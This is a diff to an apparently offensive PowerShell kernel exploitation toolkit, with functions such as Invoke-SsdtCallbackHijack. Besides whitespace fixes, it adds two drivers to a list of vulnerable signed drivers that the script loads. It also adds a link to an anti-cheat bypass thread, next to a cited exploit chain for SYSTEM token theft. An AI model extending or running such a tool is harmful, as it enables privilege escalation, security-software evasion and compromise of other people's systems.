@@ -59,15 +59,15 @@ using namespace System.Windows.Forms
             "shieldwp", "EAZShield", "TcIo", "DDDriver", "DELLWALDOS", 
             "HWAuidoOs2Ec", "HWAudioDevX64", "d591004", "d41cf5ba", 
             "mtxmem", "mtxmemmanager", "PMAD", "NTPMAD", "PDFWKRNL",
-			"AdvCare", "ArgusMonitor", "biontdrv", "CmUpx", "DDDriver", 
-			"FoxKeDriver64", "lsigetwin_SliffDriver", "MemCtl", "nxeng",
-			"Fox_FOXONE_Driver", "DELLWAL", "SliffDriver", "ArgusMonitorCTLD",
+            "AdvCare", "ArgusMonitor", "biontdrv", "CmUpx", "DDDriver", 
+            "FoxKeDriver64", "lsigetwin_SliffDriver", "MemCtl", "nxeng",
+            "Fox_FOXONE_Driver", "DELLWAL", "SliffDriver", "ArgusMonitorCTLD",
             "ArgusMonitorCTL", "ProcessCtr", "GGProtect64", "GGProtect",
             "ksapi", "ksapi64_dev", "PDFWKRNL", "TPwSav", "WDTKernel",
             "EBIoDispatch", "CcProtect", "EnPortv", "xkpsm", "pcdsrvc_x64",
             "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
             "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv",
-            "signed", "WinNotify"
+            "signed", "WinNotify", "DCRCVDrv", "DCRCVDRV_U"
 
  $Binary | % {
     $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
@@ -1641,14 +1641,14 @@ if (-not $NtApi) {
             )
         },
         @{
-	        Name       = 'RtlQueryModuleInformation'
-	        Dll        = 'ntdll.dll'
-	        ReturnType = [Int32] # NTSTATUS
-	        Parameters = @(
-		        [Int32].MakeByRefType(), # BufferSize / InformationLength
-		        [Int32],                 # UnitSize / SizePerModule (272)
-		        [IntPtr]                 # Buffer / InformationBuffer
-	        )
+            Name       = 'RtlQueryModuleInformation'
+            Dll        = 'ntdll.dll'
+            ReturnType = [Int32] # NTSTATUS
+            Parameters = @(
+                [Int32].MakeByRefType(), # BufferSize / InformationLength
+                [Int32],                 # UnitSize / SizePerModule (272)
+                [IntPtr]                 # Buffer / InformationBuffer
+            )
         }
     )
 }
@@ -6741,7 +6741,7 @@ Function Invoke-SsdtCallbackHijack {
         7  { $Hook = "NtUserToUnicodeEx"           }
         8  { $Hook = "NtUserSetWinEventHook"       }
         9  { $Hook = "NtUserInitTask"              }
-		10 { $Hook = "NtUserInitTask"              }
+        10 { $Hook = "NtUserInitTask"              }
         11 { $Hook = "NtUserInitTask"              }
         12 { $Hook = "NtUserInitTask"              }
         default {
@@ -7608,6 +7608,9 @@ function Resolve-DirectoryTable {
 
     # FastDump.sys + CITMDRV.sys + NTIOLib.sys: Full Kernel Exploit Chain — From KASLR Bypass to SYSTEM Token Theft
     # https://medium.com/@haider303mustafa/fastdump-sys-citmdrv-sys-567f57e9cd20
+
+    # How is BattleEye making the physical reading fail?
+    # https://www.unknowncheats.me/forum/anti-cheat-bypass/766384-battleeye-physical-reading-fail.html
 
     # 1. Automatically fetch and parse CR3 for the given Process ID
     try {
